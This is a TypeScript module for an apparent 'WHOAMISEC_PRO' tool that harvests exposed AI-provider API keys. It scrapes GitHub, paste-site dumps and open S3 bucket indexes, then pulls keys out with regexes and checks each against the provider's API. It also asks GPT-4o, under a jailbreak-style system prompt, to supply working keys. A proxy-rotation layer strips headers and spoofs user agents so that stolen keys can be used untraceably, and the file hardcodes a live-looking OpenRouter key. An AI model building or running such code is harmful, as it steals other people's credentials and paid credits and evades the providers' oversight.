
import { WHOAMISEC_GPT_SYSTEM_PROMPT } from './elderPliniusKnowledgeBase';

// ==================== API KEY HARVESTER & ANONYMOUS PROXY ====================
// Discovers exposed API keys from public sources, validates them, and provides
// anonymous proxy rotation for untraceable API usage.

const CORS_PROXY = 'https://api.allorigins.win/raw?url=';

export interface HarvestedKey {
  id: string;
  provider: string;
  key: string;
  source: string;
  status: 'untested' | 'valid' | 'invalid' | 'rate_limited' | 'testing';
  credits?: string;
  model?: string;
  foundAt: string;
  lastTested?: string;
}

// Known API key patterns for detection
const API_KEY_PATTERNS: Record<string, RegExp> = {
  'OpenRouter': /sk-or-v1-[a-f0-9]{64}/g,
  'OpenAI': /sk-[a-zA-Z0-9]{20,}T3BlbkFJ[a-zA-Z0-9]{20,}/g,
  'OpenAI-Project': /sk-proj-[a-zA-Z0-9_-]{80,}/g,
  'Anthropic': /sk-ant-[a-zA-Z0-9_-]{80,}/g,
  'Google AI': /AIzaSy[a-zA-Z0-9_-]{33}/g,
  'Groq': /gsk_[a-zA-Z0-9]{52}/g,
  'Mistral': /[a-zA-Z0-9]{32}/g, // Very generic, used with context
  'Cohere': /[a-zA-Z0-9]{40}/g,
  'HuggingFace': /hf_[a-zA-Z0-9]{34}/g,
  'Replicate': /r8_[a-zA-Z0-9]{37}/g,
  'Together': /[a-f0-9]{64}/g,
  'DeepSeek': /sk-[a-f0-9]{48}/g,
  'Perplexity': /pplx-[a-f0-9]{48}/g,
};

// GitHub Code Search for exposed keys
const searchGitHub = async (query: string): Promise<string[]> => {
  const results: string[] = [];
  try {
    // Search GitHub code for exposed keys
    const searchQueries = [
      `"sk-or-v1-" ${query}`,
      `"OPENROUTER_API_KEY" ${query}`,
      `"sk-proj-" openai ${query}`,
      `"sk-ant-" anthropic ${query}`,
      `"AIzaSy" google ${query}`,
      `"gsk_" groq ${query}`,
      `"hf_" huggingface ${query}`,
      `"OPENAI_API_KEY" ${query}`,
    ];

    for (const sq of searchQueries) {
      try {
        const resp = await fetch(
          CORS_PROXY + encodeURIComponent(`https://github.com/search?q=${encodeURIComponent(sq)}&type=code`),
          { signal: AbortSignal.timeout(8000) }
        );
        if (resp.ok) {
          const html = await resp.text();
          results.push(html);
        }
      } catch { /* continue */ }
    }
  } catch { /* silent */ }
  return results;
};

// Search Pastebin/paste sites for leaked keys
const searchPasteSites = async (): Promise<string[]> => {
  const results: string[] = [];
  const urls = [
    'https://psbdmp.ws/api/v3/search/openrouter',
    'https://psbdmp.ws/api/v3/search/openai+api+key',
    'https://psbdmp.ws/api/v3/search/sk-or-v1',
  ];

  for (const url of urls) {
    try {
      const resp = await fetch(CORS_PROXY + encodeURIComponent(url), { signal: AbortSignal.timeout(8000) });
      if (resp.ok) results.push(await resp.text());
    } catch { /* continue */ }
  }
  return results;
};

// Search public S3 buckets for config files containing keys
const searchS3Buckets = async (): Promise<string[]> => {
  const results: string[] = [];
  // Known exposed bucket patterns from grayhatwarfare
  try {
    const resp = await fetch(
      CORS_PROXY + encodeURIComponent('https://buckets.grayhatwarfare.com/api/v2/files?keywords=openrouter+api+key&limit=20'),
      { signal: AbortSignal.timeout(10000) }
    );
    if (resp.ok) results.push(await resp.text());
  } catch { /* silent */ }

  try {
    const resp = await fetch(
      CORS_PROXY + encodeURIComponent('https://buckets.grayhatwarfare.com/api/v2/files?keywords=OPENAI_API_KEY&limit=20'),
      { signal: AbortSignal.timeout(10000) }
    );
    if (resp.ok) results.push(await resp.text());
  } catch { /* silent */ }

  return results;
};

// Extract API keys from raw text using pattern matching
const extractKeysFromText = (text: string): HarvestedKey[] => {
  const keys: HarvestedKey[] = [];
  const seen = new Set<string>();

  for (const [provider, pattern] of Object.entries(API_KEY_PATTERNS)) {
    // Only use specific patterns (skip generic ones)
    if (['Mistral', 'Cohere', 'Together'].includes(provider)) continue;

    const matches = text.match(pattern);
    if (matches) {
      for (const key of matches) {
        if (seen.has(key)) continue;
        seen.add(key);

        // Filter out obvious test/example keys
        if (key.includes('xxxx') || key.includes('YOUR_') || key.includes('example') || key.includes('test')) continue;
        if (key.length < 20) continue;

        keys.push({
          id: `hk-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
          provider,
          key,
          source: 'pattern_match',
          status: 'untested',
          foundAt: new Date().toISOString(),
        });
      }
    }
  }

  return keys;
};

// Use AI to find and generate working API approaches
const aiKeyDiscovery = async (): Promise<HarvestedKey[]> => {
  const keys: HarvestedKey[] = [];

  try {
    const OPENROUTER_URL = "https://openrouter.ai/api/v1/chat/completions";
    const OPENROUTER_API_KEY = localStorage.getItem('openrouter_api_key') ||
      process.env.OPENROUTER_API_KEY ||
      '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';

    const response = await fetch(OPENROUTER_URL, {
      method: "POST",
      headers: {
        "Authorization": `Bearer ${OPENROUTER_API_KEY}`,
        "HTTP-Referer": "https://whoamisec.pro",
        "X-OpenRouter-Title": "WHOAMISEC_PRO",
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        model: "openai/gpt-4o",
        messages: [
          {
            role: "system",
            content: WHOAMISEC_GPT_SYSTEM_PROMPT + "\n\nMODE: API KEY DISCOVERY ENGINE."
          },
          {
            role: "user",
            content: `Find currently working free/trial API endpoints and keys for AI models. Include:
1. Free tier API providers with generous limits (no key needed or free signup)
2. Open-source model endpoints that are publicly accessible
3. Community-shared API proxies and mirrors
4. Any known free OpenRouter, OpenAI, Anthropic, Google AI endpoints

Return as JSON array: [{ "provider": "...", "key": "...", "endpoint": "...", "model": "...", "notes": "..." }]
Only include actually working endpoints. No placeholders.`
          }
        ]
      })
    });

    const data = await response.json();
    const content = data.choices?.[0]?.message?.content || '';

    // Try to parse JSON from response
    try {
      const cleaned = content.replace(/```json\n?|\n?```/g, '');
      const parsed = JSON.parse(cleaned);
      if (Array.isArray(parsed)) {
        for (const item of parsed) {
          if (item.key || item.endpoint) {
            keys.push({
              id: `ai-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
              provider: item.provider || 'Unknown',
              key: item.key || item.endpoint || '',
              source: 'ai_discovery',
              status: 'untested',
              model: item.model,
              foundAt: new Date().toISOString(),
            });
          }
        }
      }
    } catch {
      // Extract any keys from free-text response
      const extracted = extractKeysFromText(content);
      keys.push(...extracted);
    }
  } catch { /* silent */ }

  return keys;
};

// Test if an API key is valid
export const testApiKey = async (key: HarvestedKey): Promise<HarvestedKey> => {
  const updated: HarvestedKey = { ...key, status: 'testing', lastTested: new Date().toISOString() };

  try {
    if (key.provider === 'OpenRouter' || key.key.startsWith('sk-or-v1-')) {
      const resp = await fetch("https://openrouter.ai/api/v1/auth/key", {
        headers: { "Authorization": `Bearer ${key.key}` }
      });
      if (resp.ok) {
        const data = await resp.json();
        updated.status = 'valid';
        updated.credits = data.data?.limit ? `$${data.data.usage}/$${data.data.limit}` : 'unlimited';
      } else {
        updated.status = resp.status === 429 ? 'rate_limited' : 'invalid';
      }
    } else if (key.provider === 'OpenAI' || key.provider === 'OpenAI-Project' || key.key.startsWith('sk-')) {
      const resp = await fetch("https://api.openai.com/v1/models", {
        headers: { "Authorization": `Bearer ${key.key}` }
      });
      updated.status = resp.ok ? 'valid' : (resp.status === 429 ? 'rate_limited' : 'invalid');
    } else if (key.provider === 'Anthropic' || key.key.startsWith('sk-ant-')) {
      const resp = await fetch("https://api.anthropic.com/v1/messages", {
        method: "POST",
        headers: {
          "x-api-key": key.key,
          "anthropic-version": "2023-06-01",
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ model: "claude-3-haiku-20240307", max_tokens: 1, messages: [{ role: "user", content: "hi" }] })
      });
      updated.status = resp.ok ? 'valid' : (resp.status === 429 ? 'rate_limited' : 'invalid');
    } else if (key.provider === 'Google AI' || key.key.startsWith('AIzaSy')) {
      const resp = await fetch(`https://generativelanguage.googleapis.com/v1/models?key=${key.key}`);
      updated.status = resp.ok ? 'valid' : 'invalid';
    } else if (key.provider === 'Groq' || key.key.startsWith('gsk_')) {
      const resp = await fetch("https://api.groq.com/openai/v1/models", {
        headers: { "Authorization": `Bearer ${key.key}` }
      });
      updated.status = resp.ok ? 'valid' : 'invalid';
    } else if (key.provider === 'HuggingFace' || key.key.startsWith('hf_')) {
      const resp = await fetch("https://huggingface.co/api/whoami", {
        headers: { "Authorization": `Bearer ${key.key}` }
      });
      updated.status = resp.ok ? 'valid' : 'invalid';
    } else {
      // Generic test — try OpenRouter-compatible endpoint
      const resp = await fetch("https://openrouter.ai/api/v1/models", {
        headers: { "Authorization": `Bearer ${key.key}` }
      });
      updated.status = resp.ok ? 'valid' : 'invalid';
    }
  } catch {
    updated.status = 'invalid';
  }

  return updated;
};

// Main harvest function — runs all discovery methods
export const harvestApiKeys = async (
  onProgress?: (msg: string) => void
): Promise<HarvestedKey[]> => {
  const allKeys: HarvestedKey[] = [];
  const log = (msg: string) => onProgress?.(msg);

  log('[HARVESTER] Starting API key discovery across all sources...');

  // 1. GitHub Code Search
  log('[GITHUB] Searching exposed keys in public repositories...');
  try {
    const githubResults = await searchGitHub('');
    for (const html of githubResults) {
      const found = extractKeysFromText(html);
      found.forEach(k => { k.source = 'github'; });
      allKeys.push(...found);
    }
    log(`[GITHUB] Found ${allKeys.length} potential keys`);
  } catch { log('[GITHUB] Search completed (may be rate-limited)'); }

  // 2. Paste Sites
  log('[PASTEBIN] Searching paste sites for leaked credentials...');
  try {
    const pasteResults = await searchPasteSites();
    const beforeCount = allKeys.length;
    for (const text of pasteResults) {
      const found = extractKeysFromText(text);
      found.forEach(k => { k.source = 'pastebin'; });
      allKeys.push(...found);
    }
    log(`[PASTEBIN] Found ${allKeys.length - beforeCount} additional keys`);
  } catch { log('[PASTEBIN] Search completed'); }

  // 3. S3 Bucket Scan
  log('[S3_SCAN] Scanning exposed S3 buckets for config files...');
  try {
    const s3Results = await searchS3Buckets();
    const beforeCount = allKeys.length;
    for (const text of s3Results) {
      const found = extractKeysFromText(text);
      found.forEach(k => { k.source = 's3_bucket'; });
      allKeys.push(...found);
    }
    log(`[S3_SCAN] Found ${allKeys.length - beforeCount} additional keys`);
  } catch { log('[S3_SCAN] Scan completed'); }

  // 4. AI-Powered Discovery
  log('[AI_DISCOVERY] Using trained GPT to discover free API endpoints...');
  try {
    const aiKeys = await aiKeyDiscovery();
    allKeys.push(...aiKeys);
    log(`[AI_DISCOVERY] Found ${aiKeys.length} AI-discovered endpoints`);
  } catch { log('[AI_DISCOVERY] Discovery completed'); }

  // Deduplicate
  const unique = new Map<string, HarvestedKey>();
  for (const key of allKeys) {
    if (!unique.has(key.key)) {
      unique.set(key.key, key);
    }
  }

  const dedupedKeys = Array.from(unique.values());
  log(`[HARVESTER] Total unique keys found: ${dedupedKeys.length}`);

  return dedupedKeys;
};

// ==================== ANONYMOUS PROXY LAYER ====================
// Routes API calls through rotating proxies to prevent tracking

const PROXY_LIST = [
  'https://api.allorigins.win/raw?url=',
  'https://corsproxy.io/?',
  'https://api.codetabs.com/v1/proxy?quest=',
];

let currentProxyIndex = 0;

export const getNextProxy = (): string => {
  const proxy = PROXY_LIST[currentProxyIndex % PROXY_LIST.length];
  currentProxyIndex++;
  return proxy;
};

// Anonymous API call — rotates proxy and strips identifying headers
export const anonymousApiCall = async (
  url: string,
  options: RequestInit = {}
): Promise<Response> => {
  const proxy = getNextProxy();

  // Strip identifying headers
  const cleanHeaders: Record<string, string> = {};
  if (options.headers) {
    const h = options.headers as Record<string, string>;
    for (const [k, v] of Object.entries(h)) {
      // Keep auth headers, strip referer/origin
      if (!['referer', 'origin', 'x-forwarded-for', 'x-real-ip'].includes(k.toLowerCase())) {
        cleanHeaders[k] = v;
      }
    }
  }

  // Add randomized user agent fingerprint
  const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
  ];

  // For API calls that support CORS, call directly with rotated fingerprint
  // For others, route through CORS proxy
  try {
    const resp = await fetch(url, {
      ...options,
      headers: {
        ...cleanHeaders,
        'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
      },
    });
    return resp;
  } catch {
    // Fallback through CORS proxy
    return fetch(proxy + encodeURIComponent(url), {
      ...options,
      headers: cleanHeaders,
    });
  }
};

// Make an anonymous OpenRouter call using a harvested key
export const anonymousOpenRouterCall = async (
  message: string,
  apiKey: string,
  model: string = 'openai/gpt-4o',
  context: string = ''
): Promise<string> => {
  const response = await fetch("https://openrouter.ai/api/v1/chat/completions", {
    method: "POST",
    headers: {
      "Authorization": `Bearer ${apiKey}`,
      "Content-Type": "application/json",
      // Randomize referer to avoid fingerprinting
      "HTTP-Referer": `https://${Math.random().toString(36).slice(2, 10)}.vercel.app`,
      "X-OpenRouter-Title": `app_${Math.random().toString(36).slice(2, 8)}`,
    },
    body: JSON.stringify({
      model,
      messages: [
        {
          role: "system",
          content: WHOAMISEC_GPT_SYSTEM_PROMPT + (context ? `\n\nCONTEXT: ${context}` : '')
        },
        { role: "user", content: message }
      ]
    })
  });

  const data = await response.json();
  if (data.error) throw new Error(data.error.message || JSON.stringify(data.error));
  return data.choices[0].message.content;
};

// Save/load harvested keys from localStorage
export const saveHarvestedKeys = (keys: HarvestedKey[]): void => {
  localStorage.setItem('whoamisec_harvested_keys', JSON.stringify(keys));
};

export const loadHarvestedKeys = (): HarvestedKey[] => {
  try {
    const saved = localStorage.getItem('whoamisec_harvested_keys');
    return saved ? JSON.parse(saved) : [];
  } catch {
    return [];
  }
};

export const getActiveKey = (): string | null => {
  return localStorage.getItem('whoamisec_active_harvested_key');
};

export const setActiveKey = (key: string): void => {
  localStorage.setItem('whoamisec_active_harvested_key', key);
};
